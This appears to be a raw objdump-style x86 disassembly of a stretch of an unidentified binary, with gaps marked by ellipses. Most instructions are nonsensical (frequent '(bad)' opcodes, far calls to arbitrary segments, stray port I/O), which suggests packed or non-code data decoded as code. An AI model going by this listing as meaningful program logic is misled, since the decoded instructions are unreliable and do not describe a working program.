  427e2d:	inc    ebp
  427e2e:	test   al,0xb1
  427e30:	pop    eax
  427e31:	xor    cl,BYTE PTR [edi+0x37]
  427e34:	jecxz  0x427de7
  427e36:	xchg   ebx,eax
  427e37:	sub    eax,DWORD PTR [edi-0x28]
  427e3a:	pop    esp
  427e3b:	bnd jmp 0x427de0
  427e3e:	mov    esp,0xdb3e4e2a
  427e43:	ins    DWORD PTR es:[edi],dx
  427e44:	sub    BYTE PTR [edi-0xe],ah
  427e47:	jg     0x427de8
  427e49:	adc    dh,cl
  427e4b:	mov    ebx,0x342d9d13
  427e50:	xlat   BYTE PTR ds:[ebx]
  427e51:	sbb    bh,BYTE PTR [ecx]
  427e53:	adc    eax,0xb0208c78
  427e58:	stos   DWORD PTR es:[edi],eax
  427e59:	xor    eax,DWORD PTR [edi+0xd]
  427e5c:	adc    al,0xcd
  427e5e:	loopne 0x427e94
  427e60:	in     al,0xf1
  427e62:	push   edx
  427e63:	dec    edi
  427e64:	inc    ecx
  427e65:	leave  
  427e66:	xlat   BYTE PTR ds:[ebx]
  427e67:	hlt    
  427e68:	sub    ebx,DWORD PTR [eax+0x77]
  427e6b:	mov    BYTE PTR [edx],bh
  427e6d:	inc    ebp
	...
  427ed6:	mov    eax,0x6d3c25f1
  427edb:	cld    
  427edc:	mov    ecx,0x2bc293f5
  427ee1:	leave  
  427ee2:	mov    al,ds:0x67bbb25d
  427ee7:	lods   al,BYTE PTR ds:[esi]
  427ee8:	add    DWORD PTR [eax],eax
  427eea:	add    BYTE PTR [ecx],al
  427eec:	add    BYTE PTR [eax],al
  427eee:	out    0xcd,al
  427ef0:	int3   
  427ef1:	out    0xc2,al
  427ef3:	mov    dh,0xc8
  427ef5:	push   esp
  427ef6:	jmp    0x427f02
  427ef8:	test   DWORD PTR [esi],esp
  427efa:	fwait
  427efb:	add    al,0x8a
  427efd:	mov    edx,0xfafe39d6
  427f02:	dec    esi
  427f03:	or     eax,0xef798131
  427f08:	in     al,dx
  427f09:	enter  0x704a,0x65
  427f0d:	dec    ecx
  427f0e:	add    BYTE PTR [eax+0x10bd8494],0xce
  427f15:	xor    eax,0x99ce4200
  427f1a:	sub    eax,0x675f6187
  427f1f:	mov    al,ds:0x75ac45ac
  427f24:	xchg   esp,eax
  427f25:	loop   0x427f17
  427f27:	lods   eax,DWORD PTR ds:[esi]
  427f28:	fadd   QWORD PTR [ebx+edx*2-0x79]
  427f2c:	icebp  
  427f2d:	das    
  427f2e:	push   ds
  427f2f:	sti    
  427f30:	mov    al,ds:0xace16931
  427f35:	fld    DWORD PTR [eax+ecx*8]
  427f38:	into   
  427f39:	and    ch,BYTE PTR [esi]
  427f3b:	xor    esi,DWORD PTR [ecx]
  427f3d:	(bad)  
  427f3e:	cld    
  427f3f:	dec    eax
  427f40:	inc    ebp
  427f41:	(bad)
  427f44:	sbb    al,0xee
  427f46:	xchg   ecx,eax
  427f47:	ret    0x443d
  427f4a:	sub    eax,0xd76cffea
  427f4f:	out    dx,eax
  427f50:	sti    
  427f51:	adc    DWORD PTR [ebp+0x52b7abb3],esp
  427f57:	pop    esi
  427f58:	add    ch,BYTE PTR [ecx+0xc]
  427f5b:	jp     0x427fa4
  427f5d:	jecxz  0x427f69
  427f5f:	fstp   QWORD PTR [edx+eax*1+0x7c]
  427f63:	push   0xffffffea
  427f65:	scas   eax,DWORD PTR es:[edi]
  427f66:	push   0x56
  427f68:	cmp    al,0x66
  427f6a:	cmp    ah,al
  427f6c:	pop    eax
  427f6d:	retf   0xf0e
  427f70:	das    
  427f71:	outs   dx,DWORD PTR ds:[esi]
  427f72:	cmp    al,0xb3
  427f74:	popf   
  427f75:	retf   
  427f76:	jle    0x427f5a
  427f78:	mov    eax,0x66e198db
  427f7d:	das    
  427f7e:	xchg   BYTE PTR [eax],dh
  427f80:	in     al,dx
  427f81:	pop    ecx
  427f82:	dec    ebp
  427f83:	test   BYTE PTR [edx+0x5e],al
  427f86:	mov    eax,ds:0xfa61898d
  427f8b:	sub    DWORD PTR [edx],0x5e
  427f8e:	add    al,0x5e
  427f90:	ins    DWORD PTR es:[edi],dx
  427f91:	mov    ds:0xb20fc1ff,eax
  427f97:	test   BYTE PTR [esi+0x225cc898],dh
  427f9d:	xor    eax,0xd68c8eed
  427fa2:	dec    esp
  427fa3:	ror    esi,1
  427fa5:	call   0xeb3c:0x54a62d21
  427fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427fad:	call   0xf612d1d5
  427fb2:	lahf   
  427fb3:	(bad)  
  427fb5:	(bad)  
  427fb6:	fstp   QWORD PTR [ecx-0x66fb8b3d]
  427fbc:	adc    ah,cl
  427fbe:	lds    ebp,FWORD PTR [edi+0x3f]
  427fc1:	loop   0x427fa4
  427fc3:	sbb    DWORD PTR [edi+0x69],esp
  427fc6:	adc    DWORD PTR [esp+ecx*1-0x2b],esi
  427fca:	addr16 dec ecx
  427fcc:	mov    edx,DWORD PTR [esi+0x2f89b195]
  427fd2:	adc    BYTE PTR [edx+0x10c9ce1c],cl
  427fd8:	jnp    0x427f8f
  427fda:	(bad)  
  427fdb:	test   eax,0xc24faca5
  427fe0:	mov    dl,0xbe
  427fe2:	repz cld 
  427fe4:	sub    BYTE PTR [ebx+0x23],dh
  427fe7:	repnz and eax,ecx
  427fea:	aas    
  427feb:	daa    
  427fec:	jmp    0x427fdc
	...
  428056:	mov    cl,0xa7
  428058:	dec    ebx
  428059:	das    
  42805a:	pop    edi
  42805b:	out    dx,eax
  42805c:	cmc    
  42805d:	mov    edi,0x22b0803f
  428062:	inc    ebx
  428063:	sahf   
  428064:	fld    DWORD PTR [edi+eiz*2-0x53]
  428068:	add    DWORD PTR [eax],eax
  42806a:	add    BYTE PTR [ecx],al
  42806c:	add    BYTE PTR [eax],al
  42806e:	jl     0x428062
  428070:	adc    ah,BYTE PTR [ecx]
  428072:	mov    eax,ds:0x944e21d7
  428077:	dec    esi
  428078:	add    al,BYTE PTR [ecx*4-0x709f5194]
  42807f:	push   eax
  428080:	pop    ebx
  428081:	popf   
  428082:	fstp   TBYTE PTR [eax+0x5363943c]
  428088:	(bad)  
  428089:	sub    bh,ah
  42808b:	cmc    
  42808c:	repnz mov ds:0x7e2475d0,eax
  428092:	mov    dh,0xf
  428094:	stos   DWORD PTR es:[edi],eax
  428095:	ins    BYTE PTR es:[edi],dx
  428096:	fstp   QWORD PTR [esi+0x4c42e7bd]
  42809c:	sub    BYTE PTR [ebp+0x7cfbc7f6],dl
  4280a2:	inc    edx
  4280a3:	and    edi,DWORD PTR [esp+ebp*4+0x25046325]
  4280aa:	fcomp  st(7)
  4280ac:	add    ch,cl
  4280ae:	div    BYTE PTR [esi+0x29daa0e6]
  4280b4:	sub    al,0x19
  4280b6:	and    BYTE PTR [eax-0x24],0xe8
  4280ba:	lods   al,BYTE PTR ds:[esi]
  4280bb:	fdivr  QWORD PTR [eax+edx*8]
  4280be:	mov    esp,0x131c2a0a
  4280c3:	loopne 0x4280fa
  4280c5:	dec    ebx
  4280c6:	call   0x87e025aa
  4280cb:	xchg   esp,eax
  4280cc:	dec    ebp
  4280cd:	call   0x5e5a389f
  4280d2:	dec    edx
  4280d3:	daa    
  4280d4:	loop   0x42806d
  4280d6:	push   es
  4280d7:	cld    
  4280d8:	in     al,0xc6
  4280da:	(bad)  
  4280db:	out    dx,eax
  4280dc:	stc    
  4280dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280de:	je     0x428066
  4280e0:	into   
  4280e1:	cwde   
  4280e2:	shl    BYTE PTR cs:[esi-0x4001c71],0x4c
  4280ea:	xor    DWORD PTR [eax*4+0x2f453cbd],esp
  4280f1:	pop    esi
  4280f2:	xlat   BYTE PTR ds:[ebx]
  4280f3:	adc    bl,BYTE PTR [edx-0x3d]
  4280f6:	mov    ebx,0xf2534795
  4280fb:	xchg   esp,eax
  4280fc:	ret    0x9725
  4280ff:	lods   eax,DWORD PTR ds:[esi]
  428100:	xor    al,BYTE PTR ds:0x384b1852
  428106:	adc    BYTE PTR [edx-0x78a935bb],dl
  42810c:	inc    edx
  42810d:	or     dl,cl
  42810f:	sub    DWORD PTR [ecx-0x79],ecx
  428112:	fmul   DWORD PTR [esi-0x54]
  428115:	js     0x4280d4
  428117:	rol    BYTE PTR [edi+edx*8+0x4099714d],0x88
  42811f:	ja     0x4280f7
  428121:	xchg   ebx,eax
  428122:	cmp    BYTE PTR [edi-0x6fab07e3],ah
  428128:	and    BYTE PTR [ebp+0x1cd2cb4f],ah
  42812e:	cmp    eax,0x5ef2355b
  428133:	cli    
  428134:	xchg   esp,eax
  428135:	mov    al,0x16
  428137:	xlat   BYTE PTR ds:[ebx]
  428138:	mov    eax,ds:0x645d30c4
  42813d:	int3   
  42813e:	cld    
  42813f:	lahf   
  428140:	mov    esp,0x8cbd50d4
  428145:	int3   
  428146:	cld    
  428147:	imul   ebp,DWORD PTR [ecx+0x44fa8787],0xf9d8cfab
  428151:	fdivr  QWORD PTR [ebx]
  428153:	jmp    0xe1cf:0xd42d3914
  42815a:	test   eax,0xb010bcbc
  42815f:	mov    cl,0x21
  428161:	xlat   BYTE PTR ds:[ebx]
  428162:	retf   
  428163:	shl    DWORD PTR [edi],1
  428165:	dec    edi
  428166:	cmp    dl,BYTE PTR [edx]
  428168:	xchg   ebp,eax
  428169:	addr16 loopne 0x42812e
  42816c:	mov    edx,0xb1
	...
  4281d5:	add    bh,bl
  4281d7:	out    dx,al
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	int    0x98
  4281e4:	push   0x1ae6734
  4281e9:	add    BYTE PTR [eax],al
  4281eb:	add    DWORD PTR [eax],eax
  4281ed:	add    BYTE PTR [eax+0x79],dh
  4281f0:	lods   al,BYTE PTR ds:[esi]
  4281f1:	add    al,0xa0
  4281f3:	fs mov bh,0x84
  4281f6:	add    ah,BYTE PTR [edi-0x22]
  4281f9:	pop    ds
  4281fa:	ret    0x9862
  4281fd:	fistp  WORD PTR [ebx]
  4281ff:	mov    al,ds:0x7d71ad45
  428204:	fcom   DWORD PTR [ebx-0x399814e4]
  42820a:	imul   cx,WORD PTR [ebx-0x25],0x444e
  428210:	mov    cl,0x14
  428212:	jns    0x42823e
  428214:	inc    esp
  428215:	add    ch,bh
  428217:	mov    ds:0x2df30bc3,al
  42821c:	scas   al,BYTE PTR es:[edi]
  42821d:	add    al,0xf8
  42821f:	inc    ebx
  428220:	mov    DWORD PTR [ecx],ecx
  428222:	rcl    BYTE PTR [esi+0x17],cl
  428225:	inc    edx
  428226:	ror    ebp,cl
  428228:	pusha  
  428229:	xchg   edi,eax
  42822a:	mov    edx,0x8dedc590
  42822f:	mov    edx,0x8b933646
  428234:	(bad)  
  428235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428236:	les    edi,FWORD PTR [edx-0x27]
  428239:	pop    eax
  42823a:	sbb    eax,0x7e8ced52
  42823f:	fs imul esp,ebx,0x3ce74e11
  428246:	xchg   ebx,eax
  428247:	aam    0xcd
  428249:	xchg   ebx,eax
  42824a:	call   0xe43a:0x4f4516bb
  428251:	sahf   
  428252:	and    dl,BYTE PTR [ebx+ecx*2+0x699cd506]
  428259:	mov    bh,0x1d
  42825b:	mov    ebx,0xaeca3b5e
  428260:	(bad)  
  428261:	aad    0xa0
  428263:	cmp    BYTE PTR [eax+0x19930568],bh
  428269:	pop    es
  42826a:	mov    ebx,0xbf17f652
  42826f:	inc    ecx
  428270:	xchg   ebp,eax
  428271:	pop    ebx
  428272:	in     al,0xfd
  428274:	mov    dh,BYTE PTR [ecx]
  428276:	cmp    esi,DWORD PTR [ecx]
  428278:	cmp    DWORD PTR [eax+0xfb680ed],esp
  42827e:	ds push esp
  428280:	out    dx,al
  428281:	js     0x428226
  428283:	lahf   
  428284:	sbb    bl,BYTE PTR [ebp-0x56]
  428287:	sub    BYTE PTR [edi-0x2],0xc1
  42828b:	inc    edx
  42828c:	or     BYTE PTR fs:[ebx+0x5cd1c215],ah
  428293:	aad    0x5
  428295:	cs ss leave 
  428298:	lahf   
  428299:	mov    ah,0x12
  42829b:	mov    ebx,DWORD PTR [esi+0x330d7de4]
  4282a1:	scas   eax,DWORD PTR es:[edi]
  4282a2:	(bad)  
  4282a3:	in     al,dx
  4282a4:	xchg   edi,eax
  4282a5:	sar    bl,0x60
  4282a8:	xchg   ebx,eax
  4282a9:	mov    ah,BYTE PTR [ecx+esi*1+0x1f79403]
  4282b0:	rcl    BYTE PTR [eax+0x73],cl
  4282b3:	loopne 0x428283
  4282b5:	test   DWORD PTR [ebp-0x12e1431f],ebp
  4282bb:	adc    eax,0xe8f945b9
  4282c0:	sbb    DWORD PTR [ecx],eax
  4282c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4282c3:	pop    edx
  4282c4:	ret    0x20ba
  4282c7:	adc    eax,0xcb29872d
  4282cc:	ret    
  4282cd:	bound  si,DWORD PTR [eax+0x338450fd]
  4282d4:	xor    ebx,eax
  4282d6:	(bad)
  4282db:	(bad)  
  4282dc:	neg    BYTE PTR [esi+0x6b]
  4282df:	jb     0x4282ec
  4282e1:	xor    eax,0x17a084a0
  4282e6:	and    BYTE PTR [ebx-0x1d90e4b9],ah
  4282ec:	les    edx,FWORD PTR [esi+0x0]
	...
  428356:	(bad)  
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428363:	imul   dl
  428365:	xchg   ecx,eax
  428366:	scas   eax,DWORD PTR es:[di]
  428368:	add    DWORD PTR [eax],eax
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	cli    
  42836f:	cs popf 
  428371:	or     DWORD PTR [edi],esi
  428373:	(bad)  
  428374:	dec    esp
  428375:	pop    esi
  428376:	mov    esi,ebp
  428378:	popf   
  428379:	popf   
  42837a:	adc    al,0x98
  42837c:	mov    ecx,0xe91dbf4e
  428381:	push   es
  428382:	xchg   edi,eax
  428383:	xchg   ebp,eax
  428384:	add    eax,0xe580cb9c
  428389:	sti    
  42838a:	push   ds
  42838b:	push   ebx
  42838c:	(bad)  
  42838d:	imul   eax,DWORD PTR [eax-0x5998af50],0x1a
  428394:	gs addr16 enter 0x7105,0x7f
  42839a:	adc    BYTE PTR [edi-0x16],0xc5
  42839e:	(bad)
  4283a1:	fimul  WORD PTR [edx+0x4]
  4283a4:	cmp    ch,BYTE PTR [ebp+0x58ed403a]
  4283aa:	out    dx,al
  4283ab:	and    ebx,edx
  4283ad:	hlt    
  4283ae:	int    0xdd
  4283b0:	mov    edx,0x7f420ad1
  4283b5:	leave  
  4283b6:	(bad)
  4283bb:	(bad)
  4283be:	aaa    
  4283bf:	inc    ebp
  4283c0:	or     al,0xcc
  4283c2:	hlt    
  4283c3:	mov    ecx,0xd2310379
  4283c8:	sti    
  4283c9:	jns    0x4283ae
  4283cb:	mov    bh,0x3d
  4283cd:	call   0xc018:0xef025454
  4283d4:	xchg   esp,eax
  4283d5:	ret    0x2bb3
  4283d8:	add    al,0xe5
  4283da:	push   ecx
  4283db:	cmp    ah,BYTE PTR [ecx-0x516cfac0]
  4283e1:	adc    BYTE PTR [ebp+0x13aaf229],ah
  4283e7:	mov    ah,0xaf
  4283e9:	mov    dh,0x98
  4283eb:	(bad)  
  4283ec:	mov    ebx,DWORD PTR [ecx+ebx*2]
  4283ef:	pop    edi
  4283f0:	faddp  st(4),st
  4283f2:	push   ecx
  4283f3:	sub    DWORD PTR [edx+0x36],0xffffffa8
  4283f7:	(bad)  
  4283f8:	loop   0x4283fa
  4283fa:	mov    ds:0xc9762770,al
  4283ff:	clc    
  428400:	in     eax,dx
  428401:	adc    al,0xc1
  428403:	pop    esi
  428404:	jl     0x428484
  428406:	sbb    BYTE PTR [edi+0x6c013069],bl
  42840c:	retf   0x727f
  42840f:	je     0x428400
  428411:	rcl    al,cl
  428413:	mov    eax,0x1148f5ae
  428418:	sbb    cl,al
  42841a:	add    ch,ch
  42841c:	pop    ds
  42841d:	pop    edx
  42841e:	sub    al,0x81
  428420:	cmp    ecx,edx
  428422:	and    esi,0xc35d9989
  428428:	popa   
  428429:	sub    eax,0xa8ee4d86
  42842e:	sbb    eax,DWORD PTR [ecx+ecx*1+0x52]
  428432:	stos   BYTE PTR es:[edi],al
  428433:	push   ebp
  428434:	sub    BYTE PTR [eax+ebx*8-0x1d3e78d7],0xec
  42843c:	or     al,0x35
  42843e:	ret    
  42843f:	mov    al,ds:0x5742ee2e
  428444:	dec    edi
  428445:	out    0xf5,al
  428447:	mov    ah,0x35
  428449:	pusha  
  42844a:	(bad)  
  42844b:	add    eax,0xe64b8770
  428450:	push   edi
  428451:	clc    
  428452:	leave  
  428453:	(bad)
  428456:	ss sub eax,esp
  428459:	mov    cl,0xf2
  42845b:	jmp    0x4284c3
  42845d:	jle    0x428497
  42845f:	clc    
  428460:	sar    DWORD PTR fs:[ecx-0x69e63051],cl
  428467:	mov    eax,0xde10c4ea
  42846c:	(bad)  
  42846d:	fild   WORD PTR [eax]
	...
  4284d3:	add    BYTE PTR [eax],al
  4284d5:	add    BYTE PTR [esi],cl
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0x88abfb32
  4284e3:	shr    eax,1
  4284e5:	les    esp,FWORD PTR [edi-0x50]
  4284e8:	add    DWORD PTR [eax],eax
  4284ea:	add    BYTE PTR [ecx],al
  4284ec:	add    BYTE PTR [eax],al
  4284ee:	retf   0xecf2
  4284f1:	sub    eax,0xff1672b4
  4284f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284f7:	cwde   
  4284f8:	addr16 lahf 
  4284fa:	popa   
  4284fb:	out    dx,eax
  4284fc:	push   cs
  4284fd:	call   0x3bcc8f7f
  428502:	xchg   edx,eax
  428503:	jl     0x4284c1
  428505:	das    
  428506:	and    eax,0xd1588b01
  42850b:	pop    ss
  42850c:	mov    al,ds:0x87d8d0d7
  428511:	int3   
  428512:	push   esi
  428513:	xor    al,0xb4
  428515:	push   ds
  428516:	stos   BYTE PTR es:[edi],al
  428517:	add    ch,BYTE PTR [eax+0x15]
  42851a:	mov    dl,0x2d
  42851c:	push   cs
  42851d:	and    esp,DWORD PTR [edx+eax*2+0x1c]
  428521:	ret    0xdcc
  428524:	xchg   ecx,eax
  428525:	icebp  
  428526:	enter  0x9496,0x21
  42852a:	xor    eax,0x828384a4
  42852f:	int    0x9
  428531:	ja     0x4284d0
  428533:	(bad)  
  428534:	into   
  428535:	jae    0x4284bf
  428537:	xor    eax,0x948a692f
  42853c:	pusha  
  42853d:	mov    ebp,0x39a500f5
  428542:	inc    edx
  428543:	pusha  
  428544:	push   ecx
  428545:	popf   
  428546:	inc    ebp
  428547:	pop    es
  428548:	ins    BYTE PTR es:[edi],dx
  428549:	jb     0x42850d
  42854b:	adc    dl,BYTE PTR [ecx-0x4f281ec9]
  428551:	pusha  
  428552:	sub    edx,DWORD PTR [esi]
  428554:	es mov edi,0x27b85574
  42855a:	retf   
  42855b:	ret    
  42855c:	mov    BYTE PTR [esi],ch
  42855e:	push   0xfaa59424
  428563:	pop    esp
  428564:	lea    edx,[esi+ecx*8-0x4b]
  428568:	mov    edi,0xcf7e5a8a
  42856d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42856e:	lahf   
  42856f:	mov    dh,0x4d
  428571:	sub    BYTE PTR [edi+eiz*4+0x7a],0x77
  428576:	jle    0x4285a9
  428578:	xchg   DWORD PTR [edi-0x3908fe84],edi
  42857e:	xor    DWORD PTR [eax],edx
  428580:	imul   esi,DWORD PTR [eax-0x41],0x3c
  428584:	add    al,0x46
  428586:	test   BYTE PTR [ebp+0x3f],0xd9
  42858a:	fwait
  42858b:	lods   eax,DWORD PTR ds:[esi]
  42858c:	cdq    
  42858d:	aam    0xf4
  42858f:	pop    ecx
  428590:	xchg   ebp,eax
  428591:	mov    BYTE PTR ds:0xa26183c3,ch
  428597:	test   BYTE PTR [ecx+eiz*4+0x5b],0x6f
  42859c:	xor    BYTE PTR [eax+0x1a6c2ed0],0x3b
  4285a3:	cmp    ah,BYTE PTR [ebx-0x6d]
  4285a6:	add    ebx,DWORD PTR [edi-0x4872d513]
  4285ac:	add    BYTE PTR [ecx+0x54],dh
  4285af:	xchg   ecx,eax
  4285b0:	retfw  0x49b8
  4285b4:	adc    bl,BYTE PTR [ebp-0x57]
  4285b7:	fucomp st(2)
  4285b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285ba:	pop    esp
  4285bb:	mov    cl,0x30
  4285bd:	cmp    eax,0xd3324cd9
  4285c2:	inc    eax
  4285c3:	dec    edx
  4285c4:	scas   eax,DWORD PTR es:[edi]
  4285c5:	adc    ch,ch
  4285c7:	into   
  4285c8:	rol    dl,1
  4285ca:	cmp    BYTE PTR ds:0xf48e11c3,bl
  4285d0:	cmp    BYTE PTR [ecx+0x5b],dl
  4285d3:	call   FWORD PTR [ebx+0x56]
  4285d6:	dec    ebx
  4285d7:	xchg   ebp,eax
  4285d8:	mov    esi,0x500030df
  4285dd:	push   cs
  4285de:	and    edi,DWORD PTR [ebx-0x5125fb5d]
  4285e4:	push   ss
  4285e5:	retf   
  4285e6:	mov    eax,edi
  4285e8:	fs sub al,0xf5
  4285eb:	cmp    ah,0x35
	...
  428656:	push   ecx
  428657:	div    BYTE PTR ds:0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0xa76fa3f6
  428664:	mov    edi,0x1b1671b
  428669:	add    BYTE PTR [eax],al
  42866b:	add    DWORD PTR [eax],eax
  42866d:	add    BYTE PTR [edx+0x7b71727b],dh
  428673:	fwait
  428674:	cmp    BYTE PTR [esi-0x73454f80],ch
  42867a:	inc    ebx
  42867b:	push   edx
  42867c:	push   edx
  42867d:	jp     0x428614
  42867f:	or     al,0xf8
  428681:	pop    edi
  428682:	add    al,0x23
  428684:	stos   DWORD PTR es:[edi],eax
  428685:	aam    0x23
  428687:	fsubr  QWORD PTR [eax-0x3bc451d8]
  42868d:	add    BYTE PTR [ecx-0x124b85fb],dl
  428693:	add    eax,0x80dd6f43
  428698:	jb     0x4286a0
  42869a:	push   edi
  42869b:	jge    0x42864f
  42869d:	fsubr  DWORD PTR [ecx-0x8b16b03]
  4286a3:	outs   dx,BYTE PTR ds:[esi]
  4286a4:	stos   DWORD PTR es:[edi],eax
  4286a5:	call   0xf5de6679
  4286aa:	daa    
  4286ab:	jne    0x42864d
  4286ad:	pop    esp
  4286ae:	out    0x17,al
  4286b0:	sti    
  4286b1:	or     cl,BYTE PTR [ecx+edx*1]
  4286b4:	xchg   ebp,eax
  4286b5:	pop    eax
  4286b6:	shl    BYTE PTR [ebx-0x62],1
  4286b9:	fs (bad) 
  4286bb:	daa    
  4286bc:	pop    ds
  4286bd:	xor    eax,0xb3184e54
  4286c2:	sub    al,0x2d
  4286c4:	test   eax,0x220ce38d
  4286c9:	or     edx,DWORD PTR [eax]
  4286cb:	lahf   
  4286cc:	sbb    esp,eax
  4286ce:	fisttp QWORD PTR [ebp-0x8]
  4286d1:	leave  
  4286d2:	or     al,0xbb
  4286d4:	js     0x4286d9
  4286d6:	mov    ebp,0xf3a71290
  4286db:	mov    ss,WORD PTR [esi-0x1d9462fe]
  4286e1:	xchg   ebp,eax
  4286e2:	stos   DWORD PTR es:[edi],eax
  4286e3:	outs   dx,DWORD PTR ds:[esi]
  4286e4:	imul   ecx,esp,0x77
  4286e7:	fs loop 0x428689
  4286ea:	loope  0x4286b4
  4286ec:	fisttp QWORD PTR [ebp+edi*2-0x62444553]
  4286f3:	inc    ebx
  4286f4:	test   DWORD PTR [ecx],0x181a39c5
  4286fa:	mov    dl,0x47
  4286fc:	mov    eax,0xf0bbca82
  428701:	daa    
  428702:	mov    ah,0xc2
  428704:	dec    esi
  428705:	xchg   esi,eax
  428706:	data16 mov cs,WORD PTR [esi+0x3e]
  42870a:	mov    bl,0x7f
  42870c:	mov    ebx,0x532925ab
  428711:	dec    edx
  428712:	inc    ecx
  428713:	xchg   ebp,eax
  428714:	sub    al,0xb3
  428716:	dec    esp
  428717:	cs jb  0x4286d4
  42871a:	mov    ah,0x3b
  42871c:	mov    eax,ds:0xd6cdf41e
  428721:	repnz xchg edi,eax
  428723:	sub    al,0xd
  428725:	es fcmovb st,st(7)
  428728:	jae    0x42876e
  42872a:	pop    ds
  42872b:	dec    edx
  42872c:	pusha  
  42872d:	test   al,0xd
  42872f:	stc    
  428730:	add    eax,0x3ce9d446
  428735:	xchg   ebx,eax
  428736:	stos   BYTE PTR es:[edi],al
  428737:	sbb    DWORD PTR [eax+0x45ccf09],edx
  42873d:	nop
  42873e:	and    eax,0xc498f1b8
  428743:	loopne 0x42878f
  428745:	mov    ?,WORD PTR [esi-0x4bfd1ee5]
  42874b:	mov    dl,0xd3
  42874d:	shl    DWORD PTR [ebp-0x2b],1
  428750:	popa   
  428751:	and    al,0x96
  428753:	rcl    BYTE PTR [ebx],1
  428755:	mov    edi,0xc3c233b2
  42875a:	push   edi
  42875b:	push   0x28
  42875d:	ret    
  42875e:	arpl   WORD PTR [ecx+0x9],sp
  428761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428762:	mov    DWORD PTR [edi],esp
  428764:	(bad)  
  428766:	es cwde 
  428768:	push   eax
  428769:	pop    es
  42876a:	sahf   
  42876b:	nop
  42876c:	mov    ds:0x0,eax
	...
  4287d5:	add    BYTE PTR [esi+0x5b],dl
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0xc1a86f8
  4287e5:	aas    
  4287e6:	addr16 mov dl,0x1
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	add    DWORD PTR [eax],eax
  4287ed:	add    cl,cl
  4287ef:	mov    esi,0x91068f56
  4287f4:	pop    esi
  4287f5:	and    ecx,DWORD PTR [edx+0x38411ac2]
  4287fb:	stos   BYTE PTR es:[edi],al
  4287fc:	(bad)  
  4287fd:	nop
  4287fe:	jl     0x4287e7
  428800:	and    al,0xdf
  428802:	jb     0x4287b1
  428804:	test   DWORD PTR [eax],edi
  428806:	mov    ds,WORD PTR [ecx-0xb]
  428809:	(bad)  
  42880a:	out    0x85,eax
  42880c:	mov    ds:0x6adce6cf,al
  428811:	xchg   cl,bl
  428813:	jnp    0x428853
  428815:	hlt    
  428816:	adc    bl,BYTE PTR [edx+ecx*8+0x5d]
  42881a:	push   eax
  42881b:	cld    
  42881c:	mov    WORD PTR [edi+0x6d],fs
  42881f:	lea    edi,[esi]
  428821:	mov    edi,0xc0ba2600
  428826:	inc    ebp
  428827:	nop
  428828:	(bad)  
  428829:	mov    edi,0x14b1fd98
  42882e:	lods   eax,DWORD PTR ds:[esi]
  42882f:	add    DWORD PTR [esp+edx*4],0x24
  428833:	daa    
  428834:	jns    0x42888c
  428836:	mov    bl,0x7e
  428838:	mov    al,0x6
  42883a:	or     bh,BYTE PTR [ebx]
  42883c:	jp     0x428844
  42883e:	mov    bh,0xe1
  428841:	imul   bl
  428843:	pop    ecx
  428844:	gs or  dh,ch
  428847:	sub    BYTE PTR [esi-0x1e87260],al
  42884d:	rol    BYTE PTR [ecx-0x28],1
  428850:	push   0x1e
  428852:	gs jmp 0x42889a
  428855:	lods   al,BYTE PTR ds:[esi]
  428856:	adc    DWORD PTR [ecx+esi*4-0x37],edx
  42885a:	test   DWORD PTR [eax+eax*8-0x3a6a110],0xd45ca757
  428865:	addr16 jb 0x42883d
  428868:	fdiv   QWORD PTR [eax]
  42886a:	sbb    ah,dl
  42886c:	jle    0x428867
  42886e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42886f:	sub    DWORD PTR [esi+0x5b],ebp
  428872:	jbe    0x42886d
  428874:	iret   
  428875:	out    0x22,eax
  428877:	sbb    edi,DWORD PTR [edx+ecx*4+0x15]
  42887b:	loope  0x4288ab
  42887d:	fld    DWORD PTR gs:[edi]
  428880:	xchg   BYTE PTR [ebp+0xe],bl
  428883:	int    0x31
  428885:	(bad)  [eax]
  428887:	mov    ebp,0xb3bebf47
  42888c:	js     0x42882f
  42888e:	dec    eax
  42888f:	test   al,0x49
  428891:	test   cl,cl
  428893:	scas   eax,DWORD PTR es:[edi]
  428894:	adc    DWORD PTR [esi+0x40],esi
  428897:	enter  0x27b7,0x97
  42889b:	int3   
  42889c:	mov    ds:0x29fd6795,al
  4288a1:	(bad)  
  4288a2:	ja     0x4288fa
  4288a4:	xchg   ebp,eax
  4288a5:	dec    esi
  4288a6:	sahf   
  4288a7:	mov    ecx,0xb134aa68
  4288ac:	inc    edi
  4288ad:	xlat   BYTE PTR ds:[ebx]
  4288ae:	pop    eax
  4288af:	lea    ebp,[eax]
  4288b1:	xor    al,cl
  4288b3:	test   DWORD PTR [ebp+0x2d],edx
  4288b6:	fnstcw WORD PTR [edi]
  4288b8:	int    0x9f
  4288ba:	jp     0x4288d5
  4288bc:	repnz repz fwait
  4288bf:	js     0x428869
  4288c1:	cmp    eax,0x5cdcaa54
  4288c6:	dec    ebp
  4288c7:	xor    cl,bh
  4288c9:	adc    eax,0xef3b66e7
  4288ce:	outs   dx,BYTE PTR ds:[esi]
  4288cf:	mov    esp,0x9c7e95cf
  4288d4:	sti    
  4288d5:	xor    esi,DWORD PTR [esi-0x2c9495a0]
